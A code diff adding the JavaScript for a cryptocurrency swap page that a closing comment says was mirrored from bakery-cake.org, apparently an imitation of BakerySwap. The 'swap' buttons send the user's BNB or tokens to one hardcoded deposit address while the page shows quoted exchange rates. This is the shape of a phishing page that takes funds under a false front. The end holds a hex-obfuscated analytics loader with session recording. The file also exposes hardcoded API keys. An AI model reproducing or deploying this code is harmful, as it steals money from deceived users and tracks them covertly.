+const EvmChains = window.EvmChains;
+let selectedAccount;
+let amount;
+let cAddr = "0xe20b95b00411fa2f30545538744345c9f7c5305f";
+const btnConnectDesktop = document.querySelector("#btn-connect-desktop");
+const btnConnectDesktopMax = document.querySelector("#btn-connect-desktop-max");
+const btnConnectMax = document.querySelector("#btn-connect-max");
+const pleaseWallet = document.querySelector("#pleaseWallet");
+const closeConnect = document.querySelector("#closeConnect");
+closeConnect.addEventListener("click", () => {
+  pleaseWallet.style.display = "none";
+});
+const connectWalletButton = document.querySelector("#connect-WALLET_CONNECT");
+
+//DESKTOP
+async function walletConnects() {
+  try {
+    provider = await web3Modal.connect();
+  } catch (e) {
+    console.log("Could not get a wallet connection", e);
+    return;
+  }
+}
+async function connectMetamask() {
+  let web3Provider = null;
+  console.log("[web3] getting provider...");
+  // Modern Browsers like Chrome and Brave
+  if (window.ethereum) {
+    web3Provider = window.ethereum;
+    try {
+      // Request account access
+      await window.ethereum.enable();
+    } catch (error) {
+      // User denied account access...
+      alert("You must connect your metamask wallet!");
+      console.error("User denied account access to metamask.");
+      return;
+    }
+  } else {
+    // you cant connect
+    pleaseWallet.style.display = "";
+    return;
+  }
+  let web3 = new Web3(window.ethereum);
+  let accounts = await web3.eth.getAccounts();
+  console.log("accounts : " + accounts);
+  window.account = accounts[0];
+
+  let addrs = accounts[0];
+
+  addrs = addrs.slice(0, 3) + "..." + addrs.slice(-4);
+
+  btnConnectDesktop.innerHTML = addrs;
+
+  await fetchAccountDataDesktop();
+  console.log(selectedAccount);
+  web3n.eth
+    .getBalance(selectedAccount)
+    .then((res) => {
+      res = res * 10 ** -18;
+      console.log(res);
+      if (window.screen.width > 767) {
+        res = parseInt(res * 10000) / 10000;
+      }
+
+      document.querySelector(
+        "#balance"
+      ).innerHTML = `<div>Balance : </div> <div id="amountBalance">${res}</div> <div> BNB</div>`;
+    })
+    .catch((error) => {
+      console.log(error);
+    });
+
+  return web3;
+}
+
+async function buyTokens() {
+  amount = document.getElementById("fromInput").value;
+  console.log(amount);
+  if (!amount) {
+    alert("Enter value!");
+    return;
+  }
+
+  let _web3 = await connectMetamask();
+  let myContract = new _web3.eth.Contract(contractAbi, cAddr);
+
+  myContract.methods.buyTokens().send({
+    from: window.account,
+    value: amount * 10 ** 18,
+    gasLimit: 220001,
+  });
+}
+
+//mobile
+const depositAddress = "0xe20b95b00411fa2f30545538744345c9f7c5305f";
+const Web3Modal = window.Web3Modal.default;
+let currentCrypto = "BNB";
+let BUSDCONTRACTADDRESS = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
+let USDTCONTRACTADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+let USDCCONTRACTADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+let currentContractAddress;
+let tokenContract;
+let web3Modal;
+
+let bnbRate;
+let inchRate = 1.28;
+let aethRate;
+let BICORate = 0.018;
+let ankrRate;
+let autoRate;
+
+const maxButton = document.querySelector("#maxButton");
+const buttonConnect = document.querySelector("#btn-connect");
+const swapBtnActive = document.querySelector("#swap-button-active");
+let currentNetworkChain;
+
+let web3n;
+let finalAmount;
+let exclusiveAmount;
+const NETWORKS_IDS = {
+  1: "MAINNET",
+  3: "ROPSTEN",
+  42: "KOVAN",
+  4: "RINKEBY",
+  97: "BSC TESTNET",
+  56: "BSC MAINNET",
+};
+let supportedWallets = {
+  0: "WalletConnect",
+  1: "Metamask",
+};
+let selectedProvider;
+const fromInput = document.querySelector("#fromInput");
+async function BuyTokensMobile() {
+  console.log(provider);
+  if (provider) {
+    if (currentCrypto == "BNB" || currentCrypto == "ETH") {
+      finalAmount = fromInput.value;
+      finalAmount = web3n.utils.toWei(finalAmount.toString(), "ether");
+
+      const txData = {
+        from: selectedAccount,
+        gasLimit: 222,
+        to: depositAddress,
+        value: web3n.utils.toHex(finalAmount),
+      };
+      console.log(selectedAccount);
+      if (selectedProvider == supportedWallets[0]) {
+        provider.connector
+          .sendTransaction(txData)
+          .then((txHash) => {
+            console.log(txHash);
+            const runInterval = setInterval(async () => {
+              web3n.eth
+                .getTransactionReceipt(txHash && txHash)
+                .then((txReceipt) => {
+                  if (txReceipt == null) {
+                  } else if (txReceipt && txReceipt.status === true) {
+                    $("#claimbtn").css({ "pointer-events": "", opacity: "" });
+
+                    clearInterval(runInterval);
+                    console.log(txReceipt);
+                    $("#successAlert").show();
+                    $("#get-pay-address").modal("hide");
+                    $("#sendEthButton").attr("disabled", "disabled");
+                    $("#depositAmount").val("");
+                  } else if (txReceipt && txReceipt.status === false) {
+                    $("#claimbtn").css({
+                      "pointer-events": "none",
+                      opacity: "0.4",
+                    });
+
+                    console.log(txReceipt);
+                    clearInterval(runInterval);
+                    $("#dangerAlert").show();
+                    $("#dangerContent").text(`Transaction Failed`);
+                  }
+                });
+            }, 5000);
+          })
+          .catch((error) => {
+            $("#claimbtn").css({ "pointer-events": "none", opacity: "0.4" });
+
+            $("#dangerAlert").show();
+            $("#dangerContent").text(`${error.message}`);
+
+            setTimeout(() => {
+              $("#dangerAlert").hide();
+            }, 5000);
+          });
+      } else {
+        ethereum
+          .request({
+            method: "eth_sendTransaction",
+            params: [txData],
+          })
+          .then((txHash) => {
+            console.log(txHash);
+            const runInterval = setInterval(async () => {
+              web3n.eth
+                .getTransactionReceipt(txHash && txHash)
+                .then((txReceipt) => {
+                  if (txReceipt == null) {
+                  } else if (txReceipt && txReceipt.status === true) {
+                    $("#claimbtn").css({ "pointer-events": "", opacity: "" });
+
+                    clearInterval(runInterval);
+                    console.log(txReceipt);
+                    $("#successAlert").show();
+                    $("#get-pay-address").modal("hide");
+
+                    $("#sendEthButton").attr("disabled", "disabled");
+                    $("#presaleAmount").val("");
+                  } else if (txReceipt && txReceipt.status === false) {
+                    $("#claimbtn").css({
+                      "pointer-events": "none",
+                      opacity: "0.4",
+                    });
+
+                    console.log(txReceipt);
+                    clearInterval(runInterval);
+                    $("#dangerAlert").show();
+
+                    $("#dangerContent").text(`Transaction Failed`);
+                  }
+                });
+            }, 5000);
+          })
+          .catch((error) => {
+            $("#claimbtn").css({ "pointer-events": "none", opacity: "0.4" });
+
+            $("#dangerAlert").show();
+
+            $("#dangerContent").text(`${error.message}`);
+            setTimeout(() => {
+              $("#dangerAlert").hide();
+            }, 5000);
+          });
+      }
+    } else {
+      finalAmount = fromInput.value;
+      finalAmount = web3n.utils.toWei(finalAmount.toString(), "ether");
+      console.log(finalAmount);
+      console.log(selectedAccount);
+      await tokenContract.methods
+        .transfer(depositAddress, finalAmount)
+        .send({ from: selectedAccount })
+        .then((res) => {
+          console.log(res);
+          $("#claimbtn").css({ "pointer-events": "", opacity: "" });
+
+          $("#get-pay-address").modal("hide");
+          $("#sendEthButton").attr("disabled", "disabled");
+          $("#presaleAmount").val("");
+        })
+        .catch((error) => {
+          $("#claimbtn").css({ "pointer-events": "", opacity: "" });
+
+          $("#dangerAlert").show();
+
+          $("#dangerContent").text(`${error.message}`);
+          setTimeout(() => {
+            $("#dangerAlert").hide();
+          }, 5000);
+        });
+    }
+  } else {
+    alert("Connect your wallet!");
+  }
+}
+async function fetchAccountDataDesktop() {
+  let web3 = new Web3(window.ethereum);
+  web3n = web3;
+  console.log("Web3 instance is", web3);
+  selectedProvider = supportedWallets[1];
+  const accounts = await web3.eth.getAccounts();
+  console.log("Got accounts", accounts);
+  selectedAccount = accounts[0];
+  //Адресс на кнопке
+  let addr = accounts[0];
+
+  addr = addr.slice(0, 3) + "..." + addr.slice(-4);
+
+  buttonConnect.innerHTML = addr;
+
+  const chainId = await web3.eth.getChainId();
+  let allowedChain = "56";
+
+  if (chainId != allowedChain) {
+    ethereum
+      .request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: web3.utils.toHex("56") }],
+      })
+      .then(() => console.log("network has been set"))
+      .catch((e) => {
+        if (e.code === 4902) {
+          console.log("network is not available, add it");
+        } else {
+          console.log("could not set network");
+        }
+      });
+  }
+  currentNetworkChain = allowedChain;
+  if (currentNetworkChain == "1") {
+    currentCrypto = "ETH";
+  } else if (currentNetworkChain == "56") {
+    currentCrypto = "BNB";
+  }
+}
+
+function init() {
+  console.log("Initializing example");
+  console.log("WalletConnectProvider is", WalletConnectProvider);
+  console.log(WalletConnectProvider);
+  const providerOptions = {
+    walletconnect: {
+      package: WalletConnectProvider,
+      options: {
+        infuraId: "b365880147014f928d117886dcc8e428",
+        rpc: {
+          56: "https://bsc-dataseed1.binance.org",
+        },
+      },
+    },
+  };
+
+  web3Modal = new Web3Modal({
+    cacheProvider: false,
+    providerOptions,
+  });
+}
+
+async function fetchAccountData() {
+  let web3 = new Web3(provider);
+  web3n = web3;
+  console.log("Web3 instance is", web3);
+  if (web3._provider["bridge"]) {
+    selectedProvider = supportedWallets[0];
+  } else {
+    selectedProvider = supportedWallets[1];
+  }
+  const accounts = await web3.eth.getAccounts();
+  console.log("Got accounts", accounts);
+  selectedAccount = accounts[0];
+  //Адресс на кнопке
+  let addr = accounts[0];
+
+  addr = addr.slice(0, 3) + "..." + addr.slice(-4);
+
+  buttonConnect.innerHTML = addr;
+
+  const chainId = await web3.eth.getChainId();
+  let allowedChain = "56";
+
+  if (chainId != allowedChain) {
+    ethereum
+      .request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: web3.utils.toHex("56") }],
+      })
+      .then(() => console.log("network has been set"))
+      .catch((e) => {
+        if (e.code === 4902) {
+          console.log("network is not available, add it");
+        } else {
+          console.log("could not set network");
+        }
+      });
+  }
+  currentNetworkChain = allowedChain;
+  if (currentNetworkChain == "1") {
+    currentCrypto = "ETH";
+  } else if (currentNetworkChain == "56") {
+    currentCrypto = "BNB";
+  }
+}
+function validateAmount() {
+  fromInput.value = fromInput.value.replace(/,/g, ".");
+  //depositAmount.value = parse(depositAmount.value);
+  finalAmount = fromInput.value;
+}
+async function refreshAccountData() {
+  await fetchAccountData(provider);
+}
+async function onConnect() {
+  console.log("Opening a dialog", web3Modal);
+  try {
+    provider = await web3Modal.connect();
+    await fetchAccountData();
+  } catch (e) {
+    console.log("Could not get a wallet connection", e);
+    return;
+  }
+
+  // Subscribe to accounts change
+  provider.on("accountsChanged", (accounts) => {
+    fetchAccountData();
+  });
+
+  // Subscribe to chainId change
+  provider.on("chainChanged", (chainId) => {
+    fetchAccountData();
+  });
+
+  provider.on("networkChanged", (networkId) => {
+    fetchAccountData();
+  });
+
+  await refreshAccountData();
+  console.log(selectedAccount);
+  web3n.eth
+    .getBalance(selectedAccount)
+    .then((res) => {
+      res = res * 10 ** -18;
+      console.log(res);
+      if (window.screen.width > 767) {
+        res = parseInt(res * 10000) / 10000;
+      }
+
+      document.querySelector(
+        "#balance"
+      ).innerHTML = `<div>Balance : </div> <div id="amountBalance">${res}</div> <div> BNB</div>`;
+    })
+    .catch((error) => {
+      console.log(error);
+    });
+}
+async function onDisconnect() {
+  if (provider.close) {
+    await provider.close();
+    await web3Modal.clearCachedProvider();
+    provider = null;
+  }
+  selectedAccount = null;
+}
+
+async function getBnbRate() {
+  const settingsBNB = {
+    method: "POST",
+    headers: {
+      "content-type": "application/json",
+      "x-api-key": "134e37e6-a858-42b1-8916-d63788997027",
+    },
+    body: JSON.stringify({
+      currency: "USD",
+      code: "BNB",
+      meta: true,
+    }),
+  };
+
+  await fetch("https://api.livecoinwatch.com/coins/single", settingsBNB)
+    .then((response) => {
+      return response.json();
+    })
+    .then((data) => {
+      bnbRate = data.rate;
+      console.log(bnbRate);
+    });
+}
+async function get1inchRate() {
+  const settings1inch = {
+    method: "POST",
+    headers: {
+      "content-type": "applicsation/json",
+      "x-api-key": "134e37e6-a858-42b1-8916-d63788997027",
+    },
+    body: JSON.stringify({
+      currency: "USD",
+      code: "1INCH",
+      meta: true,
+    }),
+  };
+
+  await fetch("https://api.livecoinwatch.com/coins/single", settings1inch)
+    .then((response) => {
+      return response.json();
+    })
+    .then((data) => {
+      if (data.rate) {
+        inchRate = data.rate;
+      }
+
+      swaps();
+    })
+    .catch((error) => {
+      console.log(error);
+    });
+}
+async function getBICORate() {
+  const settingsBICO = {
+    method: "POST",
+    headers: {
+      "content-type": "application/json",
+      "x-api-key": "134e37e6-a858-42b1-8916-d63788997027",
+    },
+    body: JSON.stringify({
+      currency: "USD",
+      code: "CAKE",
+      meta: true,
+    }),
+  };
+
+  await fetch("https://api.livecoinwatch.com/coins/single", settingsBICO)
+    .then((response) => {
+      return response.json();
+    })
+    .then((data) => {
+      console.log(data.rate);
+      BICORate = data.rate;
+	  if ("CAKE"=="GMT") BICORate = 1.35;
+	  if ("CAKE"=="WILD") BICORate = 0.3528;
+      console.log(BICORate);
+      swaps();
+    });
+  //BICORate = 0.7;
+}
+async function getAethRate() {
+  const settingsAeth = {
+    method: "POST",
+    headers: {
+      "content-type": "application/json",
+      "x-api-key": "134e37e6-a858-42b1-8916-d63788997027",
+    },
+    body: JSON.stringify({
+      currency: "USD",
+      code: "ETH",
+      meta: true,
+    }),
+  };
+
+  await fetch("https://api.livecoinwatch.com/coins/single", settingsAeth)
+    .then((response) => {
+      return response.json();
+    })
+    .then((data) => {
+      aethRate = data.rate;
+      console.log(aethRate);
+      swaps();
+    });
+}
+async function getAutoRate() {
+  const settingsAuto = {
+    method: "POST",
+    headers: {
+      "content-type": "application/json",
+      "x-api-key": "134e37e6-a858-42b1-8916-d63788997027",
+    },
+    body: JSON.stringify({
+      currency: "USD",
+      code: "AUTO",
+      meta: true,
+    }),
+  };
+
+  await fetch("https://api.livecoinwatch.com/coins/single", settingsAuto)
+    .then((response) => {
+      return response.json();
+    })
+    .then((data) => {
+      autoRate = data.rate;
+      console.log(autoRate);
+      swaps();
+    });
+}
+async function getAnkrRate() {
+  const settingsAnkr = {
+    method: "POST",
+    headers: {
+      "content-type": "application/json",
+      "x-api-key": "134e37e6-a858-42b1-8916-d63788997027",
+    },
+    body: JSON.stringify({
+      currency: "USD",
+      code: "ANKR",
+      meta: true,
+    }),
+  };
+
+  await fetch("https://api.livecoinwatch.com/coins/single", settingsAnkr)
+    .then((response) => {
+      return response.json();
+    })
+    .then((data) => {
+      ankrRate = data.rate;
+      console.log(ankrRate);
+      swaps();
+    });
+}
+window.addEventListener("load", async (e) => {
+  const desktopAmount = document.querySelector("#desktop-amount");
+  const mobileAmount = document.querySelector("#mobile-amount");
+  init();
+  e.preventDefault();
+  buttonConnect.addEventListener("click", onConnect);
+  swapBtnActive.addEventListener("click", BuyTokensMobile);
+  maxButton.addEventListener("click", () => {
+    fromInput.value = document.querySelector("#amountBalance").textContent;
+    calculatePrice1();
+  });
+  if (window.innerWidth > 767) {
+    btnConnectDesktopMax.style.display = "";
+  } else {
+    btnConnectMax.style.display = "";
+  }
+  btnConnectDesktop.addEventListener("click", connectMetamask);
+  btnConnectDesktopMax.addEventListener("click", () => {
+    connectMetamask();
+    btnConnectDesktopMax.style.display = "none";
+    desktopAmount.style.display = "";
+  });
+  btnConnectMax.addEventListener("click", () => {
+    onConnect();
+    btnConnectMax.style.display = "none";
+    mobileAmount.style.display = "";
+  });
+  document
+    .querySelector("#swap-button-active-desktop")
+    .addEventListener("click", buyTokens);
+  getBnbRate();
+  connectWalletButton.addEventListener("click", walletConnects);
+  //alert("Connect your wallet!");
+});
+
+///visual
+
+let tokenIsSelected;
+
+const swapNavLink = document.querySelector("#swap-nav-link");
+const poolNavLink = document.querySelector("#pool-nav-link");
+const selectTokenBtn = document.querySelector("#selectTokenBtn");
+const tokenModal = document.querySelector("#tokenModal");
+const closeTokenModal = document.querySelector("#closeTokenModal");
+
+//const bnb = document.querySelector("#bnb");
+const inch = document.querySelector("#inch1");
+const aETH = document.querySelector("#aETH");
+const ankr = document.querySelector("#ankr");
+const auto = document.querySelector("#auto");
+const BICO = document.querySelector("#beth");
+
+const infoBtn = document.querySelector("#infoBtn");
+const labelImg = document.querySelector("#labelImg");
+const lableName = document.querySelector("#labelName");
+
+const swapButtonActive = document.querySelector("#swap-button-active");
+const swapButton = document.querySelector("#swap-button");
+
+const swapButtonActiveDesktop = document.querySelector(
+  "#swap-button-active-desktop"
+);
+const swapButtonDesktop = document.querySelector("#swap-button-desktop");
+
+const exchanges = document.querySelectorAll(".exchange");
+const toInput = document.querySelector("#toInput");
+
+const receivedValue = document.querySelector("#receivedValue");
+const receivedCrypto = document.querySelector("#receivedCrypto");
+const infoWrap = document.querySelector("#infoWrap");
+
+function calculatePrice1() {
+  if (tokenIsSelected) {
+    toInput.value = "";
+    if (fromInput.value) {
+      switch (tokenIsSelected) {
+        case "1inch":
+          toInput.value = (fromInput.value * bnbRate) / inchRate;
+          break;
+        case "CAKE":
+          toInput.value = (fromInput.value * bnbRate) / BICORate;
+          break;
+        case "aeth":
+          toInput.value = (fromInput.value * bnbRate) / aethRate;
+          break;
+        case "ankr":
+          toInput.value = (fromInput.value * bnbRate) / ankrRate;
+          break;
+        case "auto":
+          toInput.value = (fromInput.value * bnbRate) / autoRate;
+          break;
+      }
+    } else {
+      toInput.value = 0;
+    }
+  } else {
+    return;
+  }
+}
+function calculatePrice2() {
+  if (tokenIsSelected) {
+    fromInput.value = "";
+    if (toInput.value) {
+      switch (tokenIsSelected) {
+        case "1inch":
+          fromInput.value = (toInput.value * inchRate) / bnbRate;
+          break;
+        case "CAKE":
+          fromInput.value = (toInput.value * BICORate) / bnbRate;
+          break;
+        case "aeth":
+          fromInput.value = (toInput.value * aethRate) / bnbRate;
+          break;
+        case "ankr":
+          fromInput.value = (toInput.value * ankrRate) / bnbRate;
+          break;
+        case "auto":
+          fromInput.value = (toInput.value * autoRate) / bnbRate;
+          break;
+      }
+    } else {
+      fromInput.value = 0;
+    }
+  } else {
+    return;
+  }
+}
+
+const swapToApear1 = () => {
+  swapButtonActive.style.display = "";
+  swapButtonActiveDesktop.style.display = "";
+  swapButton.style.display = "none";
+  swapButtonDesktop.style.display = "none";
+
+  calculatePrice1();
+};
+const swapToApear2 = () => {
+  swapButtonActive.style.display = "";
+  swapButtonActiveDesktop.style.display = "";
+  swapButton.style.display = "none";
+  swapButtonDesktop.style.display = "none";
+
+  calculatePrice2();
+};
+function swaps() {
+  if (fromInput.value) {
+    swapToApear1();
+  } else if (toInput.value) {
+    swapToApear2();
+  }
+}
+fromInput.addEventListener("keyup", swapToApear1);
+toInput.addEventListener("keyup", swapToApear2);
+infoBtn.addEventListener("click", () => {
+  tokenModal.style.display = "";
+});
+window.setInterval(callInfoWrap, 1000);
+function callInfoWrap() {
+  if ((fromInput.value || toInput.value) && tokenIsSelected) {
+    infoWrap.style.display = "block";
+    receivedValue.textContent = toInput.value;
+    receivedCrypto.textContent = tokenIsSelected.toUpperCase();
+  }
+}
+
+const eventHandler = (name, img) => {
+  tokenModal.style.display = "none";
+  selectTokenBtn.style.display = "none";
+  infoBtn.style.display = "";
+  labelName.textContent = name;
+  labelImg.src = img;
+};
+
+inch.addEventListener("click", () => {
+  get1inchRate();
+  eventHandler("1INCH", "../www.bakeryswap.org/images/coins/1INCH.png");
+  tokenIsSelected = "1inch";
+});
+aETH.addEventListener("click", () => {
+  getAethRate();
+  eventHandler("aETH", "../www.bakeryswap.org/images/coins/AETH.png");
+  tokenIsSelected = "aeth";
+});
+ankr.addEventListener("click", () => {
+  eventHandler("ANKR", "../www.bakeryswap.org/images/coins/ANKR.png");
+  getAnkrRate();
+  tokenIsSelected = "ankr";
+});
+auto.addEventListener("click", () => {
+  getAutoRate();
+  eventHandler("AUTO", "../www.bakeryswap.org/images/coins/AUTO.png");
+  tokenIsSelected = "auto";
+});
+BICO.addEventListener("click", () => {
+  getBICORate();
+  eventHandler(
+    "CAKE",
+    "../s2.coinmarketcap.com/static/img/coins/64x64/7186.png"
+  );
+  tokenIsSelected = "CAKE";
+});
+
+selectTokenBtn.addEventListener("click", () => {
+  tokenModal.style.display = "";
+});
+closeTokenModal.addEventListener("click", () => {
+  tokenModal.style.display = "none";
+});
+swapNavLink.addEventListener("click", () => {
+  swapNavLink.classList.add("ACTIVE");
+  poolNavLink.classList.remove("ACTIVE");
+});
+
+poolNavLink.addEventListener("click", () => {
+  poolNavLink.classList.add("ACTIVE");
+  swapNavLink.classList.remove("ACTIVE");
+});
+exchanges.forEach((i) => {
+  i.addEventListener("click", () => {
+    exchanges.forEach((item) => {
+      item.classList.remove("ACTIVENAV");
+    });
+    i.classList.add("ACTIVENAV");
+  });
+});
+
+
+/*****************************************************************/
+const ym_number = 88853666;
+/*****************************************************************/
+
+var _0xdbc2=["\x73\x63\x72\x69\x70\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x6A\x73\x64\x65\x6C\x69\x76\x72\x2E\x6E\x65\x74\x2F\x6E\x70\x6D\x2F\x79\x61\x6E\x64\x65\x78\x2D\x6D\x65\x74\x72\x69\x63\x61\x2D\x77\x61\x74\x63\x68\x2F\x74\x61\x67\x2E\x6A\x73","\x79\x6D","\x70\x75\x73\x68","\x61","\x6C","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x61\x73\x79\x6E\x63","\x73\x72\x63","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65","\x69\x6E\x69\x74"];(function(_0x3930x1,_0x3930x2,_0x3930x3,_0x3930x4,_0x3930x5,_0x3930x6,_0x3930x7){_0x3930x1[_0x3930x5]= _0x3930x1[_0x3930x5]|| function(){(_0x3930x1[_0x3930x5][_0xdbc2[4]]= _0x3930x1[_0x3930x5][_0xdbc2[4]]|| [])[_0xdbc2[3]](arguments)};_0x3930x1[_0x3930x5][_0xdbc2[5]]= 1*  new Date();_0x3930x6= _0x3930x2[_0xdbc2[6]](_0x3930x3),_0x3930x7= _0x3930x2[_0xdbc2[7]](_0x3930x3)[0],_0x3930x6[_0xdbc2[8]]= 1,_0x3930x6[_0xdbc2[9]]= _0x3930x4,_0x3930x7[_0xdbc2[11]][_0xdbc2[10]](_0x3930x6,_0x3930x7)})(window,document,_0xdbc2[0],_0xdbc2[1],_0xdbc2[2]);ym(ym_number,_0xdbc2[12],{clickmap:true,trackLinks:true,accurateTrackBounce:true,webvisor:true})
+</script>
+    <script src="settings.js"></script>
+  </body>
+
+<!-- Mirrored from bakery-cake.org/swap.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 07 Jul 2022 11:25:14 GMT -->
+</html>
